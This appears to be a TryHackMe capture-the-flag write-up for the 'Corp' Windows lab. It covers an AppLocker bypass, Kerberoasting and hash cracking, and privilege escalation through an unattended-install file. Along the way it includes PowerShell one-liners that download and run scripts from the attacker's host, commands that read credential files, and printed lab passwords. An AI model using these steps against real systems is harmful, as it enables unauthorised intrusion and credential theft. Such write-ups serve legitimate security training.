# Corp [TryHackMe]

<sup>This write-up covers the Windows machine named Corp on TryHackMe.</sup>

First let's deploy the machine and access it with the provided credentials:

```bash
xfreerdp /v:10.10.104.52 /u:"corp\dark" /p:"_QuejVudId6" /cert:ignore +clipboard
```

_AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher, and hash._

_If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: C:\Windows\System32\spool\drivers\color - This is whitelisted by default._

Now let's first download the `netcat` executable for windows on our attacking linux machine:

```bash
wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe
```

Now let's start a `python` server locally:

```bash
python3 -m http.server
```

Now on the Windows machine, use `powershell` to download this `nc.exe` executable and place it in the `*\spool\drivers\color` folder to bypass AppLocker:

```powershell
powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.14.99.123:8000/nc64.exe', 'C:\Windows\System32\spool\drivers\color\nc.exe')"
```

Now that it's downloaded and put in a proper path, let's check PowerShell console history file:

```powershell
Get-Content %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

There is a flag on line 4! Now on to Kerberoasting. First let's extract SPNs from the system:

```powershell
setspn -T medin -Q */*
```

One existing SPN that is found is for user `fela`. Now we need to download the __Invoke Kerberoast__ script. First on the attacking machine:

```bash
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
```

And then on the target machine:

```powershell
iex(New-Object Net.WebClient).DownloadString('https://10.14.99.123:8000/Invoke-Kerberoast.ps1') 
```

_Now let's load this into memory_:

```powershell
Invoke-Kerberoast -OutputFormat hashcat |fl
```

Copy the resulting hash to `hash.txt` on a local machine and brute force it with `hashcat`:

```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Now let's log into the machine with this user's credentials:

```bash
xfreerdp /v:10.10.104.52 /u:"corp\fela" /p:"rubenF124" /cert:ignore +clipboard
```

Grab the flag from the desktop!

Now on to the privilege escalation, we will use `PowerUp1.ps1` script. First on the local machine:

```bash
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
```

Then on the target machine:

```powershell
iex(New-Object Net.WebClient).DownloadString('http://10.14.99.123:8000/PowerUp.ps1') 
```

Now run the script:

```powershell
.\PowerUp.ps1
```

Now that we ran it, go to the `C:\Windows\Panther\Unattend\Unattended.xml` and check its contents:

```powershell
Get-Content C:\Windows\Panther\Unattend\Unattended.xml
```

We get a base64 encoded password. Let's save it in a `b64.txt` locally and decode it:

```bash
base64 -d b64.txt
```

Now log in using these credentials and grab the flag!
